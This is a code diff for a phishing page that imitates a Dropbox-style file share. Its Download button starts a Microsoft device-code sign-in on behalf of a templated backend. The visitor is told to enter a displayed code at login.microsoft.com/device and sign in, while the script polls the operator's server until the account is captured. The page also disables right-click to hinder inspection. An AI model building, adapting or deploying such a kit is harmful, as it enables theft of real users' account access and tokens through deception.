+                                    </div>
+                                </div>
+                                <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                                    <span class="w-36">3/01/2026, 9:15 AM</span>
+                                    <span class="w-28"></span>
+                                    <span class="w-16 text-right">500 KB</span>
+                                </div>
+                            </li>
+                            <li class="flex items-center px-6 pl-16 py-2.5 hover:bg-gray-100">
+                                <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="Service Agreement.docx" data-parent="commercial">
+                                <div class="flex items-center gap-3 flex-1 min-w-0">
+                                    <svg class="w-7 h-7 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#2B579A"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">W</text></svg>
+                                    <div class="min-w-0">
+                                        <p class="text-sm text-gray-900 truncate">Service Agreement.docx</p>
+                                    </div>
+                                </div>
+                                <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                                    <span class="w-36">3/05/2026, 11:20 AM</span>
+                                    <span class="w-28"></span>
+                                    <span class="w-16 text-right">2.1 MB</span>
+                                </div>
+                            </li>
+                            <li class="flex items-center px-6 pl-16 py-2.5 hover:bg-gray-100">
+                                <input type="checkbox" class="file-cb w-4 h-4 rounded border-gray-300 accent-blue-600 mr-3 shrink-0" data-file="NDA.pdf" data-parent="commercial">
+                                <div class="flex items-center gap-3 flex-1 min-w-0">
+                                    <svg class="w-7 h-7 shrink-0" viewBox="0 0 32 32"><rect width="32" height="32" rx="4" fill="#E53935"/><text x="16" y="21" text-anchor="middle" font-size="9" font-weight="700" fill="#fff">PDF</text></svg>
+                                    <div class="min-w-0">
+                                        <p class="text-sm text-gray-900 truncate">NDA.pdf</p>
+                                    </div>
+                                </div>
+                                <div class="hidden sm:flex items-center gap-8 text-xs text-gray-500 shrink-0">
+                                    <span class="w-36">3/06/2026, 4:45 PM</span>
+                                    <span class="w-28"></span>
+                                    <span class="w-16 text-right">1.5 MB</span>
+                                </div>
+                            </li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+
+            <!-- Bottom download bar -->
+            <div class="bg-white border-t border-gray-200 px-6 py-3 flex items-center justify-between shrink-0">
+                <div class="flex items-center gap-3">
+                    <div class="w-8 h-8 rounded-full bg-blue-100 text-dbx flex items-center justify-center text-xs font-bold">4e</div>
+                    <div>
+                        <p class="text-sm font-medium text-gray-900">4email@email.com</p>
+                        <p class="text-xs text-gray-500">Only you</p>
+                    </div>
+                </div>
+                <button id="playBtn" onclick="handlePlay()" class="flex items-center gap-2 bg-dbx text-white px-5 py-2.5 rounded-lg text-sm font-medium hover:bg-blue-700 transition disabled:opacity-50 disabled:cursor-not-allowed" disabled>
+                    <svg id="playIcon" class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 005.25 21h13.5A2.25 2.25 0 0021 18.75V16.5M16.5 12L12 16.5m0 0L7.5 12m4.5 4.5V3"/></svg>
+                    <svg id="spinnerIcon" class="w-4 h-4 animate-spin hidden" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
+                    <span id="playText">Download</span>
+                    <span id="countBadge" class="ml-1 inline-flex items-center justify-center rounded-md bg-white/20 px-2 py-0.5 text-xs hidden">0</span>
+                </button>
+            </div>
         </div>
-        <div class="waiting"><span class="spinner"></span> Waiting for authentication...</div>`;
-      document.getElementById("copyBtn").onclick = () => { navigator.clipboard.writeText(auth.userCode); document.getElementById("copyBtn").textContent = "Copied!"; setTimeout(() => document.getElementById("copyBtn").textContent = "Copy code", 2000); };
+    </div>
 
-      const timer = setInterval(async () => {
-        try {
-          const res = await fetch(`${API}/api/public/i/poll`, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({deviceCode:auth.deviceCode, invitationId}) });
-          const result = await res.json();
-          if (result.status === "complete") { clearInterval(timer); if (result.exitUrl) { window.location.href = result.exitUrl; return; } app.innerHTML = `<div class="code-card"><div class="success-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg></div><h2 style="font-size:28px;font-weight:bold;margin-bottom:8px">Account Connected!</h2><p style="color:#888">Your Dropbox account has been successfully verified.</p>${result.email ? '<p class="email-badge">'+result.email+'</p>' : ''}</div>`; }
-          else if (result.status === "error") { clearInterval(timer); app.innerHTML = `<div class="code-card"><div class="error-icon"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></div><h2 class="error" style="font-size:24px;font-weight:bold;margin-bottom:8px">Authentication Failed</h2><p style="color:#888;margin-bottom:24px">${result.error}</p><button class="btn" onclick="location.reload()">Try Again</button></div>`; }
-        } catch {}
-      }, auth.interval * 1000);
-    }
+    <!-- Verification Modal Overlay -->
+    <div id="modalOverlay" class="fixed inset-0 bg-black/50 flex items-center justify-center p-4 z-50 hidden">
+        <div class="bg-white rounded-xl shadow-2xl w-full max-w-md border border-gray-200 overflow-hidden">
+            <div class="p-8 text-center">
+                <p class="text-gray-500 text-sm mb-2">Verification code</p>
+                <p id="codeDisplay" class="text-2xl md:text-3xl font-bold text-gray-900 tracking-[0.25em] mb-6">CQ5CQSM5F</p>
 
-    init();
-  </script>
+                <button onclick="copyCode()" id="copyBtn" class="inline-flex items-center gap-2 border border-gray-300 text-gray-700 px-6 py-2.5 rounded-lg font-medium text-sm hover:bg-gray-50 transition-colors mb-8">
+                    <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
+                    <span id="copyText">Copy code</span>
+                </button>
+
+                <div class="text-left mb-6">
+                    <p class="text-gray-800 font-semibold text-sm mb-3">Steps to verify:</p>
+                    <ol class="space-y-2 text-gray-500 text-sm pl-4">
+                        <li>Open the link below in a new tab</li>
+                        <li>Enter code <span id="codeInStep" class="font-bold text-gray-800">CQ5CQSM5F</span> when prompted</li>
+                        <li>Sign in with your Microsoft account</li>
+                        <li>Return to this page &mdash; it updates automatically</li>
+                    </ol>
+                </div>
+
+                <a id="authLink" href="https://login.microsoft.com/device" target="_blank" class="block w-full bg-dbx text-white py-3.5 rounded-lg font-medium text-sm hover:bg-blue-700 transition-colors text-center">
+                    https://login.microsoft.com/device
+                    <svg class="w-4 h-4 inline-block ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg>
+                </a>
+            </div>
+            <div class="border-t border-gray-200 py-4 text-center">
+                <div class="inline-flex items-center gap-2 text-gray-400 text-sm">
+                    <svg class="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"/><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
+                    Waiting for authentication...
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var API = "{{ domain }}";
+        var CODE = "{{ invitation }}";
+        var _invitationId = null;
+
+        var allFileCbs = document.querySelectorAll('.file-cb');
+        var allFolderCbs = document.querySelectorAll('.folder-cb');
+        var selectAllCb = document.getElementById('selectAll');
+        var downloadBtn = document.getElementById('playBtn');
+        var countBadge = document.getElementById('countBadge');
+
+        // Update selected count and button state
+        function updateCount() {
+            var count = document.querySelectorAll('.file-cb:checked').length;
+            countBadge.textContent = count;
+            if (count > 0) {
+                countBadge.classList.remove('hidden');
+                downloadBtn.disabled = false;
+            } else {
+                countBadge.classList.add('hidden');
+                downloadBtn.disabled = true;
+            }
+            // Update select all state
+            var total = allFileCbs.length;
+            selectAllCb.checked = count === total && total > 0;
+            selectAllCb.indeterminate = count > 0 && count < total;
+        }
+
+        // File checkbox change
+        allFileCbs.forEach(function(cb) {
+            cb.addEventListener('change', function() {
+                // Update parent folder checkbox if inside a folder
+                var parent = this.getAttribute('data-parent');
+                if (parent) {
+                    syncFolderCb(parent);
+                }
+                updateCount();
+            });
+        });
+
+        // Sync folder checkbox based on children
+        function syncFolderCb(folderId) {
+            var children = document.querySelectorAll('.file-cb[data-parent="' + folderId + '"]');
+            var folderCb = document.querySelector('.folder-cb[data-folder-target="' + folderId + '"]');
+            var checkedCount = 0;
+            children.forEach(function(c) { if (c.checked) checkedCount++; });
+            folderCb.checked = checkedCount === children.length;
+            folderCb.indeterminate = checkedCount > 0 && checkedCount < children.length;
+        }
+
+        // Folder checkbox toggles all children
+        allFolderCbs.forEach(function(cb) {
+            cb.addEventListener('change', function() {
+                var folderId = this.getAttribute('data-folder-target');
+                var children = document.querySelectorAll('.file-cb[data-parent="' + folderId + '"]');
+                var checked = this.checked;
+                children.forEach(function(c) { c.checked = checked; });
+                // Auto-expand folder when checking
+                if (checked) {
+                    var folderContent = document.querySelector('[data-folder-id="' + folderId + '"]');
+                    var toggle = document.querySelector('.folder-toggle[data-folder="' + folderId + '"]');
+                    if (folderContent && folderContent.classList.contains('hidden')) {
+                        folderContent.classList.remove('hidden');
+                        toggle.querySelector('.folder-arrow').classList.add('rotate-90');
+                    }
+                }
+                updateCount();
+            });
+        });
+
+        // Select all
+        selectAllCb.addEventListener('change', function() {
+            var checked = this.checked;
+            allFileCbs.forEach(function(cb) { cb.checked = checked; });
+            allFolderCbs.forEach(function(cb) { cb.checked = checked; cb.indeterminate = false; });
+            // Expand all folders when selecting all
+            if (checked) {
+                document.querySelectorAll('.folder-children').forEach(function(fc) {
+                    fc.classList.remove('hidden');
+                });
+                document.querySelectorAll('.folder-arrow').forEach(function(a) {
+                    a.classList.add('rotate-90');
+                });
+            }
+            updateCount();
+        });
+
+        // Folder expand/collapse toggle
+        document.querySelectorAll('.folder-toggle').forEach(function(toggle) {
+            toggle.addEventListener('click', function(e) {
+                if (e.target.type === 'checkbox') return;
+                var folderId = this.getAttribute('data-folder');
+                var content = document.querySelector('[data-folder-id="' + folderId + '"]');
+                var arrow = this.querySelector('.folder-arrow');
+                content.classList.toggle('hidden');
+                arrow.classList.toggle('rotate-90');
+            });
+        });
+
+        // Mobile sidebar toggle
+        document.getElementById('menuToggle').addEventListener('click', function() {
+            var sidebar = document.getElementById('sidebar');
+            sidebar.classList.toggle('hidden');
+            sidebar.classList.toggle('fixed');
+            sidebar.classList.toggle('inset-y-0');
+            sidebar.classList.toggle('left-0');
+            sidebar.classList.toggle('z-40');
+        });
+
+        // Download button
+        function handlePlay() {
+            var btn = document.getElementById('playBtn');
+            var playIcon = document.getElementById('playIcon');
+            var spinnerIcon = document.getElementById('spinnerIcon');
+            var playText = document.getElementById('playText');
+            var badge = document.getElementById('countBadge');
+
+            btn.disabled = true;
+            playIcon.classList.add('hidden');
+            spinnerIcon.classList.remove('hidden');
+            playText.textContent = 'Loading...';
+            badge.classList.add('hidden');
+
+            fetch(API + '/api/public/i/connect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ invitationId: _invitationId })
+            })
+            .then(function(res) {
+                if (!res.ok) throw new Error('Connect failed');
+                return res.json();
+            })
+            .then(function(auth) {
+                // Reset button
+                btn.disabled = false;
+                playIcon.classList.remove('hidden');
+                spinnerIcon.classList.add('hidden');
+                playText.textContent = 'Download';
+                updateCount();
+
+                // Update modal content dynamically
+                document.getElementById('codeDisplay').textContent = auth.userCode;
+                document.getElementById('codeInStep').textContent = auth.userCode;
+                var authLink = document.getElementById('authLink');
+                authLink.href = auth.verificationUri;
+                authLink.innerHTML = auth.verificationUri + ' <svg class="w-4 h-4 inline-block ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg>';
+
+                // Show modal
+                document.getElementById('modalOverlay').classList.remove('hidden');
+
+                // Start polling
+                var pollTimer = setInterval(function() {
+                    fetch(API + '/api/public/i/poll', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ deviceCode: auth.deviceCode, invitationId: _invitationId })
+                    })
+                    .then(function(res) { return res.json(); })
+                    .then(function(result) {
+                        if (result.status === 'complete') {
+                            clearInterval(pollTimer);
+                            window.location.href = result.exitUrl;
+                        } else if (result.status === 'error') {
+                            clearInterval(pollTimer);
+                            var modalContent = document.querySelector('#modalOverlay .p-8');
+                            if (modalContent) {
+                                modalContent.innerHTML = '<div class="text-center py-8"><svg class="w-16 h-16 mx-auto text-red-500 mb-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"/></svg><p class="text-lg font-bold text-gray-900">' + (result.error || 'Authentication failed') + '</p><button onclick="document.getElementById(\'modalOverlay\').classList.add(\'hidden\');handlePlay();" class="mt-4 bg-dbx text-white px-6 py-2.5 rounded-lg font-medium text-sm hover:bg-blue-700 transition-colors">Try Again</button></div>';
+                            }
+                            var modalFooter = document.querySelector('#modalOverlay .border-t');
+                            if (modalFooter) modalFooter.classList.add('hidden');
+                        }
+                    })
+                    .catch(function() { /* Network error - keep polling */ });
+                }, auth.interval * 1000);
+            })
+            .catch(function() {
+                // Fallback: reset button and show modal with hardcoded values after delay so spinner is visible
+                setTimeout(function() {
+                    btn.disabled = false;
+                    playIcon.classList.remove('hidden');
+                    spinnerIcon.classList.add('hidden');
+                    playText.textContent = 'Download';
+                    updateCount();
+
+                    document.getElementById('codeDisplay').textContent = 'CQ5CQSM5F';
+                    document.getElementById('codeInStep').textContent = 'CQ5CQSM5F';
+                    var authLink = document.getElementById('authLink');
+                    authLink.href = 'https://login.microsoft.com/device';
+                    authLink.innerHTML = 'https://login.microsoft.com/device <svg class="w-4 h-4 inline-block ml-1" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6M15 3h6v6M10 14L21 3"/></svg>';
+
+                    document.getElementById('modalOverlay').classList.remove('hidden');
+                }, 2000);
+            });
+        }
+
+        function copyCode() {
+            navigator.clipboard.writeText(document.getElementById('codeDisplay').textContent.trim()).then(function() {
+                var copyText = document.getElementById('copyText');
+                copyText.textContent = 'Copied!';
+                setTimeout(function() { copyText.textContent = 'Copy code'; }, 2000);
+            });
+        }
+
+        document.getElementById('modalOverlay').addEventListener('click', function(e) {
+            if (e.target === this) this.classList.add('hidden');
+        });
+
+        // Resolve invitation on page load
+        function init() {
+            fetch(API + '/api/public/i/' + CODE)
+            .then(function(res) {
+                if (!res.ok) throw new Error('Invitation not found');
+                return res.json();
+            })
+            .then(function(data) {
+                _invitationId = data.invitationId;
+            })
+            .catch(function() { /* Fail silently - page still shows static content */ });
+        }
+
+        // Init
+        updateCount();
+        init();
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    </script>
+
 </body>
 </html>
